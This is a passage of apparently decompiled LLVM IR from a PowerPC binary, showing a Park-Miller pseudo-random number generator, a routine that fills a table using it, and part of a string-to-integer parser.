  %v2_100089ec = inttoptr i32 %v1_100089ec to i32*
  %v3_100089ec = load i32, i32* %v2_100089ec, align 4
  %v1_100089f0 = add i32 %v2_100089e4, 4
  store i32 %v1_100089f0, i32* %r8.global-to-local, align 4
  %v1_100089f4 = add i32 %v3_100089e8, 4
  %v1_100089f8 = inttoptr i32 %v3_100089e8 to i32*
  %v2_100089f8 = load i32, i32* %v1_100089f8, align 4
  store i32 %v2_100089f8, i32* %r9.global-to-local, align 4
  store i32 %v1_100089f4, i32* %r10.global-to-local, align 4
  %v2_10008a04 = icmp ult i32 %v1_100089f0, %v3_100089ec
  %v1_10008a08 = inttoptr i32 %v2_100089e4 to i32*
  %v2_10008a08 = load i32, i32* %v1_10008a08, align 4
  %v2_10008a0c = add i32 %v2_10008a08, %v2_100089f8
  %v1_10008a10 = udiv i32 %v2_10008a0c, 2
  store i32 %v1_10008a10, i32* %r9.global-to-local, align 4
  store i32 %v2_10008a0c, i32* %v1_10008a08, align 4
  %v0_10008a18 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008a18 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10008a18, i32* %v2_10008a18, align 4
  br i1 %v2_10008a04, label %dec_label_pc_10008a28, label %dec_label_pc_10008a20

dec_label_pc_10008a20:                            ; preds = %dec_label_pc_100089e4
  %v0_10008a20 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10008a20, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008a30

dec_label_pc_10008a28:                            ; preds = %dec_label_pc_100089e4
  %v2_100089fc = icmp ult i32 %v1_100089f4, %v3_100089ec
  br i1 %v2_100089fc, label %dec_label_pc_10008a30, label %dec_label_pc_10008a2c

dec_label_pc_10008a2c:                            ; preds = %dec_label_pc_10008a28
  %v0_10008a2c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10008a2c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008a30

dec_label_pc_10008a30:                            ; preds = %dec_label_pc_10008a28, %dec_label_pc_10008a20, %dec_label_pc_10008a2c
  %v0_10008a30 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10008a30, i32* %v2_100089e8, align 4
  %v0_10008a34 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10008a34, i32* %arg1, align 4
  br label %dec_label_pc_10008a38

dec_label_pc_10008a38:                            ; preds = %dec_label_pc_100089c8, %dec_label_pc_10008a30
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10008a0c, { 1, 0 }
  uselistorder i32 %v1_100089f4, { 1, 0 }
  uselistorder i32 %v3_100089ec, { 1, 0 }
  uselistorder i32 %v3_100089e8, { 1, 0, 2 }
  uselistorder i32 %v1_100089d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008a38, { 1, 0 }
  uselistorder label %dec_label_pc_10008a30, { 2, 0, 1 }
}

define i32 @function_10008a40() local_unnamed_addr {
dec_label_pc_10008a40:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10008a44 = load i32, i32* @lr, align 4
  store i32 %v0_10008a44, i32* %r0.global-to-local, align 4
  %v0_10008a50 = load i32, i32* @r4, align 4
  store i32 %v0_10008a50, i32* @r30, align 4
  %v1_10008a58 = add i32 %v0_10008a50, 12
  %v2_10008a58 = inttoptr i32 %v1_10008a58 to i32*
  %v3_10008a58 = load i32, i32* %v2_10008a58, align 4
  store i32 %v3_10008a58, i32* %r0.global-to-local, align 4
  %v2_10008a5c = icmp ugt i32 %v3_10008a58, 4
  br i1 %v2_10008a5c, label %dec_label_pc_10008b0c, label %dec_label_pc_10008a64

dec_label_pc_10008a64:                            ; preds = %dec_label_pc_10008a40
  %v0_10008a64 = load i32, i32* @r3, align 4
  %v3_10008a64 = icmp eq i32 %v0_10008a64, 0
  %v1_10008a68 = add i32 %v0_10008a50, 8
  %v2_10008a68 = inttoptr i32 %v1_10008a68 to i32*
  %v3_10008a68 = load i32, i32* %v2_10008a68, align 4
  store i32 %v3_10008a68, i32* %r10.global-to-local, align 4
  br i1 %v3_10008a64, label %dec_label_pc_10008a70, label %dec_label_pc_10008a74

dec_label_pc_10008a70:                            ; preds = %dec_label_pc_10008a64
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_10008a74

dec_label_pc_10008a74:                            ; preds = %dec_label_pc_10008a64, %dec_label_pc_10008a70
  %v0_10008a78 = phi i32 [ %v0_10008a64, %dec_label_pc_10008a64 ], [ 1, %dec_label_pc_10008a70 ]
  %v3_10008a74 = icmp eq i32 %v3_10008a58, 0
  %v2_10008a78 = inttoptr i32 %v3_10008a68 to i32*
  store i32 %v0_10008a78, i32* %v2_10008a78, align 4
  br i1 %v3_10008a74, label %dec_label_pc_10008b08, label %dec_label_pc_10008a80

dec_label_pc_10008a80:                            ; preds = %dec_label_pc_10008a74
  %v0_10008a80 = load i32, i32* @r30, align 4
  %v1_10008a80 = add i32 %v0_10008a80, 16
  %v2_10008a80 = inttoptr i32 %v1_10008a80 to i32*
  %v3_10008a80 = load i32, i32* %v2_10008a80, align 4
  store i32 %v3_10008a80, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10008a94 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10008a80, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10008a80, 0
  br i1 %tmp18, label %dec_label_pc_10008ad4.preheader, label %dec_label_pc_10008ad4.preheader.thread

dec_label_pc_10008ad4.preheader.thread:           ; preds = %dec_label_pc_10008a80
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008ad8

dec_label_pc_10008ad4.preheader:                  ; preds = %dec_label_pc_10008a80
  %v1_10008ad42 = add i32 %v3_10008a80, -1
  store i32 %v1_10008ad42, i32* %ctr.global-to-local, align 4
  %v2_10008ad43 = icmp eq i32 %v1_10008ad42, 0
  br i1 %v2_10008ad43, label %dec_label_pc_10008ad8, label %dec_label_pc_10008ab0

dec_label_pc_10008ab0:                            ; preds = %dec_label_pc_10008ad4.preheader, %dec_label_pc_10008ad0.dec_label_pc_10008ab0_crit_edge
  %v1_10008ad0 = phi i32 [ %v2_10008ad0, %dec_label_pc_10008ad0.dec_label_pc_10008ab0_crit_edge ], [ %v0_10008a94, %dec_label_pc_10008ad4.preheader ]
  %v1_10008ab0 = phi i32 [ %v1_10008ab0.pre, %dec_label_pc_10008ad0.dec_label_pc_10008ab0_crit_edge ], [ 127773, %dec_label_pc_10008ad4.preheader ]
  %v0_10008ab0 = load i32, i32* @r3, align 4
  %v2_10008ab0 = sdiv i32 %v0_10008ab0, %v1_10008ab0
  %v2_10008ab4 = mul i32 %v2_10008ab0, %v1_10008ab0
  %v1_10008ab8 = mul i32 %v2_10008ab0, 2836
  store i32 %v1_10008ab8, i32* %r0.global-to-local, align 4
  %v2_10008abc = sub i32 %v0_10008ab0, %v2_10008ab4
  %v1_10008ac0 = mul i32 %v2_10008abc, 16807
  %v2_10008ac4 = sub i32 %v1_10008ac0, %v1_10008ab8
  store i32 %v2_10008ac4, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_10008ac4, -1
  br i1 %tmp19, label %dec_label_pc_10008ad0, label %dec_label_pc_10008acc

dec_label_pc_10008acc:                            ; preds = %dec_label_pc_10008ab0
  %v1_10008acc = load i32, i32* %r7.global-to-local, align 4
  %v2_10008acc = add i32 %v1_10008acc, %v2_10008ac4
  store i32 %v2_10008acc, i32* @r3, align 4
  br label %dec_label_pc_10008ad0

dec_label_pc_10008ad0:                            ; preds = %dec_label_pc_10008ab0, %dec_label_pc_10008acc
  %v0_10008ad0 = phi i32 [ %v2_10008ac4, %dec_label_pc_10008ab0 ], [ %v2_10008acc, %dec_label_pc_10008acc ]
  %v2_10008ad0 = add i32 %v1_10008ad0, 4
  %v3_10008ad0 = inttoptr i32 %v2_10008ad0 to i32*
  store i32 %v0_10008ad0, i32* %v3_10008ad0, align 4
  %v0_10008ad4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008ad4 = add i32 %v0_10008ad4, -1
  store i32 %v1_10008ad4, i32* %ctr.global-to-local, align 4
  %v2_10008ad4 = icmp eq i32 %v1_10008ad4, 0
  br i1 %v2_10008ad4, label %dec_label_pc_10008ad4.dec_label_pc_10008ad8_crit_edge, label %dec_label_pc_10008ad0.dec_label_pc_10008ab0_crit_edge

dec_label_pc_10008ad0.dec_label_pc_10008ab0_crit_edge: ; preds = %dec_label_pc_10008ad0
  %v1_10008ab0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008ab0

dec_label_pc_10008ad4.dec_label_pc_10008ad8_crit_edge: ; preds = %dec_label_pc_10008ad0
  %v0_10008ad8.pre = load i32, i32* @r30, align 4
  %v0_10008adc.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10008ae0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008ad8

dec_label_pc_10008ad8:                            ; preds = %dec_label_pc_10008ad4.preheader.thread, %dec_label_pc_10008ad4.dec_label_pc_10008ad8_crit_edge, %dec_label_pc_10008ad4.preheader
  %v0_10008ae0 = phi i32 [ %v0_10008ae0.pre, %dec_label_pc_10008ad4.dec_label_pc_10008ad8_crit_edge ], [ %v0_10008a94, %dec_label_pc_10008ad4.preheader ], [ %v0_10008a94, %dec_label_pc_10008ad4.preheader.thread ]
  %v0_10008adc = phi i32 [ %v0_10008adc.pre, %dec_label_pc_10008ad4.dec_label_pc_10008ad8_crit_edge ], [ %v3_10008a80, %dec_label_pc_10008ad4.preheader ], [ %v3_10008a80, %dec_label_pc_10008ad4.preheader.thread ]
  %v1_10008ae0 = phi i32 [ %v0_10008ad8.pre, %dec_label_pc_10008ad4.dec_label_pc_10008ad8_crit_edge ], [ %v0_10008a80, %dec_label_pc_10008ad4.preheader ], [ %v0_10008a80, %dec_label_pc_10008ad4.preheader.thread ]
  %v1_10008ad8 = add i32 %v1_10008ae0, 20
  %v2_10008ad8 = inttoptr i32 %v1_10008ad8 to i32*
  %v3_10008ad8 = load i32, i32* %v2_10008ad8, align 4
  store i32 %v3_10008ad8, i32* %r0.global-to-local, align 4
  %v1_10008adc = mul i32 %v0_10008adc, 10
  store i32 %v1_10008adc, i32* %r31.global-to-local, align 4
  %v2_10008ae0 = add i32 %v1_10008ae0, 4
  %v3_10008ae0 = inttoptr i32 %v2_10008ae0 to i32*
  store i32 %v0_10008ae0, i32* %v3_10008ae0, align 4
  %v0_10008ae4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008ae4 = mul i32 %v0_10008ae4, 4
  %v0_10008ae8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008ae8 = add i32 %v0_10008ae8, %v1_10008ae4
  store i32 %v2_10008ae8, i32* %r0.global-to-local, align 4
  %v1_10008aec = load i32, i32* @r30, align 4
  %v2_10008aec = inttoptr i32 %v1_10008aec to i32*
  store i32 %v2_10008ae8, i32* %v2_10008aec, align 4
  %v2_10008b00 = ptrtoint i32* %stack_var_-24 to i32
  %v0_10008af821 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008af822 = add i32 %v0_10008af821, -1
  store i32 %v1_10008af822, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_10008af822, -1
  br i1 %tmp2025, label %dec_label_pc_10008af4, label %dec_label_pc_10008b08

dec_label_pc_10008af4:                            ; preds = %dec_label_pc_10008ad8, %dec_label_pc_10008af4
  %v0_10008afc26 = load i32, i32* @r30, align 4
  %v2_10008af4 = inttoptr i32 %v0_10008afc26 to i32*
  %v3_10008af4 = call i32 @function_100089b0(i32* %v2_10008af4, i32 %v2_10008b00)
  %v0_10008af8 = load i32, i32* @r31, align 4
  %v1_10008af8 = add i32 %v0_10008af8, -1
  store i32 %v1_10008af8, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_10008af8, -1
  br i1 %tmp20, label %dec_label_pc_10008af4, label %dec_label_pc_10008b08

dec_label_pc_10008b08:                            ; preds = %dec_label_pc_10008ad8, %dec_label_pc_10008af4, %dec_label_pc_10008a74
  br label %dec_label_pc_10008b0c

dec_label_pc_10008b0c:                            ; preds = %dec_label_pc_10008a40, %dec_label_pc_10008b08
  %v0_10008b10 = phi i32 [ -1, %dec_label_pc_10008a40 ], [ 0, %dec_label_pc_10008b08 ]
  store i32 %v0_10008a44, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008b10

; uselistorder directives
  uselistorder i32 %v1_10008ad4, { 1, 0 }
  uselistorder i32 %v2_10008ad0, { 1, 0 }
  uselistorder i32 %v2_10008ac4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10008ab0, { 1, 0 }
  uselistorder i32 %v0_10008a94, { 1, 2, 0 }
  uselistorder i32 %v3_10008a80, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_10008b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10008b08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008af4, { 1, 0 }
  uselistorder label %dec_label_pc_10008ad8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008ad0, { 1, 0 }
  uselistorder label %dec_label_pc_10008ab0, { 1, 0 }
  uselistorder label %dec_label_pc_10008a74, { 1, 0 }
}

define i32 @function_10008b24(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008b24:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10008b28 = load i32, i32* @lr, align 4
  store i32 %v0_10008b28, i32* %r0.global-to-local, align 4
  %v2_10008b2c = icmp ugt i32 %arg2, 127
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f1e4.282 to i32), i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_10008b44 = sub i32 255, %arg2
  %v2_10008b44 = sub i32 -1, %arg2
  %not.v5_10008b44 = icmp ugt i32 %v1_10008b44, %v2_10008b44
  %v6_10008b48 = sext i1 %not.v5_10008b44 to i32
  %v1_10008b4c = add i32 %tmp, 4
  store i32 %v1_10008b4c, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_10008b5c = sub nsw i32 3, %v6_10008b48
  store i32 %v1_10008b5c, i32* @r31, align 4
  br i1 %v2_10008b2c, label %dec_label_pc_10008b84, label %dec_label_pc_10008b64

dec_label_pc_10008b64:                            ; preds = %dec_label_pc_10008b24
  %v2_10008b38 = icmp ugt i32 %arg2, 31
  %v1_10008b64 = sub i32 63, %arg2
  %not.v5_10008b64 = icmp ugt i32 %v1_10008b64, %v2_10008b44
  %v6_10008b68 = sext i1 %not.v5_10008b64 to i32
  %v1_10008b70 = sub nsw i32 1, %v6_10008b68
  store i32 %v1_10008b70, i32* @r31, align 4
  br i1 %v2_10008b38, label %dec_label_pc_10008b84, label %dec_label_pc_10008b78

dec_label_pc_10008b78:                            ; preds = %dec_label_pc_10008b64
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp6 = icmp ult i32 %arg2, 8
  br i1 %tmp6, label %dec_label_pc_10008be4, label %dec_label_pc_10008b84

dec_label_pc_10008b84:                            ; preds = %dec_label_pc_10008b78, %dec_label_pc_10008b64, %dec_label_pc_10008b24
  %v0_10008b84 = phi i32 [ 0, %dec_label_pc_10008b78 ], [ %v1_10008b70, %dec_label_pc_10008b64 ], [ %v1_10008b5c, %dec_label_pc_10008b24 ]
  %v1_10008b84 = mul nsw i32 %v0_10008b84, 4
  store i32 %v1_10008b84, i32* %r0.global-to-local, align 4
  %v2_10008b88 = add i32 %arg3, 12
  %v3_10008b88 = inttoptr i32 %v2_10008b88 to i32*
  store i32 %v0_10008b84, i32* %v3_10008b88, align 4
  %v0_10008b8c = load i32, i32* %r0.global-to-local, align 4
  %v1_10008b8c = load i32, i32* %r11.global-to-local, align 4
  %v2_10008b8c = add i32 %v1_10008b8c, %v0_10008b8c
  store i32 %v2_10008b8c, i32* %r9.global-to-local, align 4
  %v3_10008b90 = inttoptr i32 %v2_10008b8c to i32*
  %v4_10008b90 = load i32, i32* %v3_10008b90, align 4
  store i32 %v4_10008b90, i32* %r0.global-to-local, align 4
  %v1_10008b94 = add i32 %v2_10008b8c, 20
  %v2_10008b94 = inttoptr i32 %v1_10008b94 to i32*
  %v3_10008b94 = load i32, i32* %v2_10008b94, align 4
  store i32 %v3_10008b94, i32* %r9.global-to-local, align 4
  %v0_10008b98 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008b98 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008b98 = add i32 %v1_10008b98, 8
  %v3_10008b98 = inttoptr i32 %v2_10008b98 to i32*
  store i32 %v0_10008b98, i32* %v3_10008b98, align 4
  %v0_10008b9c = load i32, i32* %r0.global-to-local, align 4
  %v1_10008b9c = load i32, i32* %r30.global-to-local, align 4
  %v2_10008b9c = add i32 %v1_10008b9c, 20
  %v3_10008b9c = inttoptr i32 %v2_10008b9c to i32*
  store i32 %v0_10008b9c, i32* %v3_10008b9c, align 4
  %v0_10008ba0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008ba0 = mul i32 %v0_10008ba0, 4
  store i32 %v1_10008ba0, i32* %r0.global-to-local, align 4
  %v1_10008ba4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008ba4 = add i32 %v1_10008ba4, 16
  %v3_10008ba4 = inttoptr i32 %v2_10008ba4 to i32*
  store i32 %v0_10008ba0, i32* %v3_10008ba4, align 4
  %v0_10008ba8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008ba8 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008ba8 = add i32 %v1_10008ba8, %v0_10008ba8
  store i32 %v2_10008ba8, i32* %r0.global-to-local, align 4
  %v1_10008bac = load i32, i32* %r30.global-to-local, align 4
  %v2_10008bac = add i32 %v1_10008bac, 24
  %v3_10008bac = inttoptr i32 %v2_10008bac to i32*
  store i32 %v2_10008ba8, i32* %v3_10008bac, align 4
  store i32 ptrtoint (i32* @global_var_10008bb4.284 to i32), i32* @lr, align 4
  %v0_10008bb0 = call i32 @function_10008a40()
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10008bb8 = load i32, i32* @r31, align 4
  %v3_10008bb8 = icmp eq i32 %v0_10008bb8, 0
  %v1_10008bbc = load i32, i32* %r27.global-to-local, align 4
  %v2_10008bbc = inttoptr i32 %v1_10008bbc to i32*
  store i32 0, i32* %v2_10008bbc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10008bb8, label %dec_label_pc_10008bf8, label %dec_label_pc_10008bc8

dec_label_pc_10008bc8:                            ; preds = %dec_label_pc_10008b84
  %v0_10008bc8 = load i32, i32* @r30, align 4
  %v1_10008bc8 = add i32 %v0_10008bc8, 4
  %v2_10008bc8 = inttoptr i32 %v1_10008bc8 to i32*
  %v3_10008bc8 = load i32, i32* %v2_10008bc8, align 4
  %v0_10008bcc = load i32, i32* %r29.global-to-local, align 4
  %v2_10008bcc = sub i32 %v3_10008bc8, %v0_10008bcc
  %v4_10008bd0 = sdiv i32 %v2_10008bcc, 4
  %v1_10008bd4 = mul i32 %v4_10008bd0, 5
  %v1_10008bd8 = load i32, i32* @r31, align 4
  %v2_10008bd8 = add i32 %v1_10008bd4, %v1_10008bd8
  store i32 %v2_10008bd8, i32* %r0.global-to-local, align 4
  %v1_10008bdc = load i32, i32* %r27.global-to-local, align 4
  %v2_10008bdc = inttoptr i32 %v1_10008bdc to i32*
  store i32 %v2_10008bd8, i32* %v2_10008bdc, align 4
  %v0_10008c08.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bf8

dec_label_pc_10008be4:                            ; preds = %dec_label_pc_10008b78
  %v0_10008be4 = call i32 @function_10004e38()
  store i32 %v0_10008be4, i32* %r3.global-to-local, align 4
  %v0_10008be8 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008be8 = inttoptr i32 %v0_10008be4 to i32*
  store i32 %v0_10008be8, i32* %v2_10008be8, align 4
  %v0_10008bec = call i32 @function_10004e38()
  %v0_10008bf0 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008bf0 = inttoptr i32 %v0_10008bec to i32*
  store i32 %v0_10008bf0, i32* %v2_10008bf0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bf8

dec_label_pc_10008bf8:                            ; preds = %dec_label_pc_10008b84, %dec_label_pc_10008bc8, %dec_label_pc_10008be4
  %v0_10008c08 = phi i32 [ 0, %dec_label_pc_10008b84 ], [ %v0_10008c08.pre, %dec_label_pc_10008bc8 ], [ -1, %dec_label_pc_10008be4 ]
  store i32 %v0_10008b28, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008c08

; uselistorder directives
  uselistorder i32 %v0_10008ba0, { 1, 0 }
  uselistorder i32 %v2_10008b8c, { 1, 0, 2 }
  uselistorder i32 %v0_10008b84, { 1, 0 }
  uselistorder i32 %v2_10008b44, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 ()* @function_10008a40, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000f1e4.282 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 3, 5, 0, 2, 4 }
  uselistorder label %dec_label_pc_10008bf8, { 2, 1, 0 }
}

define i32 @function_10008c0c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008c0c:
  %r10.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 10, i32* %r30.global-to-local, align 4
  store i32 1, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_10008c44 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_10008c44, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008c50

dec_label_pc_10008c4c:                            ; preds = %dec_label_pc_10008c50
  %v1_10008c4c = add i32 %v0_10008c84, 1
  store i32 %v1_10008c4c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008c50

dec_label_pc_10008c50:                            ; preds = %dec_label_pc_10008c0c, %dec_label_pc_10008c4c
  %v0_10008c84 = phi i32 [ %tmp, %dec_label_pc_10008c0c ], [ %v1_10008c4c, %dec_label_pc_10008c4c ]
  %v1_10008c50 = inttoptr i32 %v0_10008c84 to i8*
  %v2_10008c50 = load i8, i8* %v1_10008c50, align 1
  %v3_10008c50 = zext i8 %v2_10008c50 to i32
  %v1_10008c54 = mul nuw nsw i32 %v3_10008c50, 2
  %v2_10008c58 = add i32 %v1_10008c54, %v3_10008c44
  %v3_10008c58 = inttoptr i32 %v2_10008c58 to i16*
  %v4_10008c58 = load i16, i16* %v3_10008c58, align 2
  %v1_10008c5c = and i16 %v4_10008c58, 32
  %v3_10008c5c = icmp eq i16 %v1_10008c5c, 0
  br i1 %v3_10008c5c, label %dec_label_pc_10008c64, label %dec_label_pc_10008c4c

dec_label_pc_10008c64:                            ; preds = %dec_label_pc_10008c50
  %v3_10008c64 = icmp eq i8 %v2_10008c50, 43
  br i1 %v3_10008c64, label %dec_label_pc_10008c84, label %dec_label_pc_10008c6c

dec_label_pc_10008c6c:                            ; preds = %dec_label_pc_10008c64
  %v3_10008c6c = icmp eq i8 %v2_10008c50, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_10008c6c, label %dec_label_pc_10008c84, label %dec_label_pc_10008c88

dec_label_pc_10008c84:                            ; preds = %dec_label_pc_10008c64, %dec_label_pc_10008c6c
  %storemerge = phi i32 [ 1, %dec_label_pc_10008c6c ], [ 0, %dec_label_pc_10008c64 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_10008c84 = add i32 %v0_10008c84, 1
  store i32 %v1_10008c84, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008c88

dec_label_pc_10008c88:                            ; preds = %dec_label_pc_10008c6c, %dec_label_pc_10008c84
  %v1_10008c88 = call i32 @__asm_rlwinm.(i32 10, i32 0, i32 28, i32 26)
  %v4_10008c88 = icmp eq i32 %v1_10008c88, 0
  br i1 %v4_10008c88, label %dec_label_pc_10008c94, label %dec_label_pc_10008c88.dec_label_pc_10008cd0_crit_edge

dec_label_pc_10008c88.dec_label_pc_10008cd0_crit_edge: ; preds = %dec_label_pc_10008c88
  %v0_10008cd0.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008cd0

dec_label_pc_10008c94:                            ; preds = %dec_label_pc_10008c88
  %v0_10008c94 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008c94 = inttoptr i32 %v0_10008c94 to i8*
  %v2_10008c94 = load i8, i8* %v1_10008c94, align 1
  %v0_10008c98 = load i32, i32* %r30.global-to-local, align 4
  %v1_10008c98 = add i32 %v0_10008c98, 10
  store i32 %v1_10008c98, i32* %r30.global-to-local, align 4
  %v3_10008c9c = icmp eq i8 %v2_10008c94, 48
  br i1 %v3_10008c9c, label %dec_label_pc_10008ca4, label %dec_label_pc_10008cc4

dec_label_pc_10008ca4:                            ; preds = %dec_label_pc_10008c94
  %v1_10008ca4 = add i32 %v0_10008c94, 1
  %v2_10008ca4 = inttoptr i32 %v1_10008ca4 to i8*
  %v3_10008ca4 = load i8, i8* %v2_10008ca4, align 1
  %v4_10008ca4 = zext i8 %v3_10008ca4 to i32
  store i32 %v1_10008ca4, i32* %r31.global-to-local, align 4
  %v1_10008ca8 = add i32 %v0_10008c98, 8
  store i32 %v1_10008ca8, i32* %r30.global-to-local, align 4
  %v1_10008cac = or i32 %v4_10008ca4, 32
  %v3_10008cb4 = icmp eq i32 %v1_10008cac, 120
  br i1 %v3_10008cb4, label %dec_label_pc_10008cbc, label %dec_label_pc_10008cc4

dec_label_pc_10008cbc:                            ; preds = %dec_label_pc_10008ca4
  %v1_10008cbc = mul i32 %v1_10008ca8, 2
  store i32 %v1_10008cbc, i32* %r30.global-to-local, align 4
  %v1_10008cc0 = add i32 %v0_10008c94, 2
  store i32 %v1_10008cc0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008cc4

dec_label_pc_10008cc4:                            ; preds = %dec_label_pc_10008ca4, %dec_label_pc_10008c94, %dec_label_pc_10008cbc
  %v0_10008d7815 = phi i32 [ %v1_10008ca4, %dec_label_pc_10008cbc ], [ %tmp, %dec_label_pc_10008c94 ], [ %v1_10008ca4, %dec_label_pc_10008ca4 ]
  %v0_10008cc4 = phi i32 [ %v1_10008cbc, %dec_label_pc_10008cbc ], [ %v1_10008c98, %dec_label_pc_10008c94 ], [ %v1_10008ca8, %dec_label_pc_10008ca4 ]
  %tmp22 = icmp slt i32 %v0_10008cc4, 17
  br i1 %tmp22, label %dec_label_pc_10008cd0, label %dec_label_pc_10008ccc

dec_label_pc_10008ccc:                            ; preds = %dec_label_pc_10008cc4
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008cd0

dec_label_pc_10008cd0:                            ; preds = %dec_label_pc_10008c88.dec_label_pc_10008cd0_crit_edge, %dec_label_pc_10008cc4, %dec_label_pc_10008ccc
  %v0_10008d7814 = phi i32 [ %tmp, %dec_label_pc_10008c88.dec_label_pc_10008cd0_crit_edge ], [ %v0_10008d7815, %dec_label_pc_10008cc4 ], [ %v0_10008d7815, %dec_label_pc_10008ccc ]
  %v1_10008ce4 = phi i32 [ %v0_10008cd0.pre, %dec_label_pc_10008c88.dec_label_pc_10008cd0_crit_edge ], [ %v0_10008cc4, %dec_label_pc_10008cc4 ], [ 16, %dec_label_pc_10008ccc ]
  %v1_10008cd0 = add i32 %v1_10008ce4, -2
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10008cd8 = icmp ugt i32 %v1_10008cd0, 34
  br i1 %v2_10008cd8, label %dec_label_pc_10008d70, label %dec_label_pc_10008ce0

dec_label_pc_10008ce0:                            ; preds = %dec_label_pc_10008cd0
  %v2_10008ce4 = udiv i32 -1, %v1_10008ce4
  store i32 %v2_10008ce4, i32* %r29.global-to-local, align 4
